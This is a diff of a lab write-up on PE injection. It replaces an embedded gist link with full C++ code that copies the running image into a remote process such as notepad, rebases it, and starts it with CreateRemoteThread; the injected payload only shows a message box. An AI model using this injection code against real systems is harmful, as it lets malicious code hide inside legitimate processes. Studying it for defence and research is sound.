@@ -29,15 +29,15 @@ High level process of the technique as used in this lab:
 
 Getting `sizeOfImage` of the current process \(local process\) that will be injecting itself into a target process and allocating a new memory block in the local process:
 
-![](../../.gitbook/assets/image%20%2881%29.png)
+![](../../.gitbook/assets/image%20%2882%29.png)
 
 In my case, the new memory block got allocated at address `0x000001813acc0000`. Let's copy the current process's image in there:
 
-![](../../.gitbook/assets/image%20%28158%29.png)
+![](../../.gitbook/assets/image%20%28159%29.png)
 
 Let's allocate a new block of memory in the target process. In my case it got allocated at `0x000001bfc0c20000`:
 
-![](../../.gitbook/assets/image%20%28123%29.png)
+![](../../.gitbook/assets/image%20%28124%29.png)
 
 Calculate the delta between 0x000001bfc0c20000 and 0x000001813acc0000 and apply image base relocations. Once that's done, we can move over our rebased PE from 0x000001813acc0000 to 0x000001bfc0c20000 in the remote process using `WriteProcessMemory`. Below shows that our imaged has now been moved to the remote process:
 
@@ -59,7 +59,65 @@ Below shows how we've injected the PE into the notepad \(PID 11068\) and execute
 
 ## Code
 
-{% embed url="https://gist.github.com/mantvydasb/229d58d0686cacb7fe52135cf8ee0f1d" %}
+```cpp
+#include "pch.h"
+#include <stdio.h>
+#include <Windows.h>
+
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
+
+DWORD InjectionEntryPoint()
+{
+	CHAR moduleName[128] = "";
+	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
+	MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
+	return 0;
+}
+
+int main()
+{
+	PVOID imageBase = GetModuleHandle(NULL);
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
+	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);
+	
+	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
+	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
+	
+	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 11068);
+	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
+
+	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	DWORD relocationEntriesCount = 0;
+	PDWORD_PTR patchedAddress;
+	PBASE_RELOCATION_ENTRY relocationRVA = NULL;
+	
+	while (relocationTable->SizeOfBlock > 0)
+	{
+		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
+		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
+
+		for (short i = 0; i < relocationEntriesCount; i++)
+		{
+			if (relocationRVA[i].Offset)
+			{
+				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
+				*patchedAddress += deltaImageBase;
+			}
+		}
+		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
+	}
+
+	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);
+	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
+
+	return 0;
+}
+```
 
 ## References
 
